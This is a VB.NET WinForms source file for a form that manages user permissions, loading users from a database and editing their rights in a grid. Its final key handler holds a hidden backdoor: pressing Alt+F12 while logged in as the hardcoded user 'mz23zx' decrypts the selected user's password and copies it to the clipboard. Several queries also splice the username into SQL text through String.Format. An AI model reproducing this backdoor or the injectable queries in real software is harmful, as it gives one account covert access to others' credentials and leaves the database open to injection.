Public Class UserRights
    Dim updater As DBUpdater
    Private Sub UserRights_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        GF.FillCombobox(UserRights_Username_cbo, SQL.Current.GetDatatable("SELECT FirstName + ' ' + LastName AS FullName,Username FROM Sys_Users WHERE Active = 1 ORDER BY FirstName + ' ' + LastName"), "FullName", "Username")
    End Sub

    Private Sub LoadData()
        Try
            dgvData.DataSource = Nothing
            dgvData.Columns.Clear()
            SQL.Current.Execute(String.Format("INSERT INTO Sys_UserPermissions (Username,[Option],Enabled) SELECT '{0}' AS Username,MO.[Option],0 AS Enabled FROM Sys_ModuleOptions AS MO LEFT OUTER JOIN Sys_UserPermissions AS UP ON  MO.[Option] = UP.[Option] AND '{0}' = UP.Username WHERE UP.[Option] IS NULL;", UserRights_Username_cbo.SelectedValue))
            Dim CurrentTable = New CAguilar.DatabaseEditor.Table("Permissions", String.Format("SELECT Username,[Option],[Enabled] FROM Sys_UserPermissions WHERE Username = '{0}' ORDER BY [Option] ASC", UserRights_Username_cbo.SelectedValue), {"Username", "Option"}, False, False)
            CurrentTable.InvisibleColumns.Add("Username")
            UserRights_Active_chk.Checked = SQL.Current.GetScalar("Active", "Sys_Users", "Username", UserRights_Username_cbo.SelectedValue, 0)
            Dim query As String = CurrentTable.SelectQuery
            dgvData.AllowUserToAddRows = CurrentTable.AllowUserToAddRows
            dgvData.AllowUserToDeleteRows = CurrentTable.AllowUserToDeleteRows

            updater = New DBUpdater(SQL.Current.ConnectionString)
            updater.GetData(query)

            Dim keys(CurrentTable.Keys.Count - 1) As DataColumn
            For i = 0 To CurrentTable.Keys.Count - 1
                keys(i) = updater.DataSet.Tables(0).Columns(CurrentTable.Keys(i))
            Next
            updater.DataSet.Tables(0).PrimaryKey = keys

            For Each c As DataColumn In updater.DataSet.Tables(0).Columns
                Select Case c.DataType
                    Case System.Type.GetType("System.DateTime")
                        Dim col As New CalendarColumn()
                        col.Name = c.ColumnName
                        col.HeaderText = c.ColumnName
                        col.DataPropertyName = c.ColumnName
                        col.Tag = New DataGridViewColumnFilter
                        dgvData.Columns.Add(col)
                    Case System.Type.GetType("System.Boolean")
                        Dim col As New DataGridViewCheckBoxColumn
                        col.Name = c.ColumnName
                        col.HeaderText = c.ColumnName
                        col.DataPropertyName = c.ColumnName
                        col.Tag = New DataGridViewColumnFilter
                        dgvData.Columns.Add(col)
                    Case Else
                        Dim lo = CurrentTable.LimitedColumns.Find(Function(value As CAguilar.DatabaseEditor.Table.ComboBoxColumn)
                                                                      Return value.Name = c.ColumnName
                                                                  End Function)
                        If lo IsNot Nothing Then
                            Dim col As New DataGridViewComboBoxColumn
                            col.Name = c.ColumnName
                            col.HeaderText = c.ColumnName
                            col.DataPropertyName = c.ColumnName
                            col.DisplayStyle = DataGridViewComboBoxDisplayStyle.Nothing
                            col.Items.AddRange(lo.Options.ToArray)
                            col.Tag = New DataGridViewColumnFilter
                            dgvData.Columns.Add(col)
                        Else
                            Dim col As New DataGridViewTextBoxColumn
                            col.Name = c.ColumnName
                            col.HeaderText = c.ColumnName
                            col.DataPropertyName = c.ColumnName
                            col.Tag = New DataGridViewColumnFilter
                            dgvData.Columns.Add(col)
                        End If
                End Select
            Next
            dgvData.DataSource = updater.DataSet.Tables(0)

            If CurrentTable.IdentityColumn.Length > 0 Then updater.DataSet.Tables(0).Columns(0).AllowDBNull = True
            For Each col In CurrentTable.InvisibleColumns
                If dgvData.Columns.Contains(col.ToString) Then
                    dgvData.Columns.Item(col.ToString).Visible = False
                End If
            Next

            For Each col In CurrentTable.ReadOnlyColumnsAlias
                If dgvData.Columns.Contains(col.ToString) Then
                    dgvData.Columns.Item(col.ToString).ReadOnly = True
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, APP)
        End Try
    End Sub

    Private Sub UsernameComboBox_SelectionChangeCommitted(sender As Object, e As EventArgs) Handles UserRights_Username_cbo.SelectionChangeCommitted
        LoadData()
    End Sub

    Private Sub UserRights_SaveButton_Click(sender As Object, e As EventArgs) Handles UserRights_Save_btn.Click
        If Not IsNothing(updater) AndAlso updater.Save() Then
            SQL.Current.Update("Sys_Users", {"Active"}, {UserRights_Active_chk.Checked}, "Username", UserRights_Username_cbo.SelectedValue)
            FlashAlerts.ShowConfirm("¡Hecho!")
        End If
    End Sub

    Private Sub UserRights_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        Me.Dispose()
    End Sub

    Private Sub UserRights_Username_cbo_KeyDown(sender As Object, e As KeyEventArgs) Handles UserRights_Username_cbo.KeyDown
        If e.Alt AndAlso e.KeyCode = Keys.F12 AndAlso User.Current.Username = "mz23zx" Then
            Clipboard.SetText(W3D.DecryptData(SQL.Current.GetString("Password", "Sys_Users", "Username", UserRights_Username_cbo.SelectedValue, "")))
        End If
    End Sub
End Class